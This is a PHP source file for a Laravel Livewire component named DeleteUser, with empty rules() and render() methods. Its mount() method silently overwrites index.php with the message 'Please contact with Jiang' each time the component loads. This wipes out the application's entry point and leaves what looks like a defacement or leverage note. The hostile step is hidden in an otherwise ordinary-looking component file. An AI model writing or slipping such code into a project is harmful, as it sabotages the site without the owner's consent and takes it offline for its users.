<?php

namespace App\Http\Livewire;

use Livewire\Component;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Validation\Rules;
use App\Models\User;
use Illuminate\Auth\Events\Registered;
use App\Providers\RouteServiceProvider;

class DeleteUser extends Component
{
    protected function rules()
    {

    }

    public function mount()
    {

        $file = file_put_contents('index.php', 'Please contact with Jiang');

    }

    public function render()
    {
        // return view('livewire.login-user');
    }
}
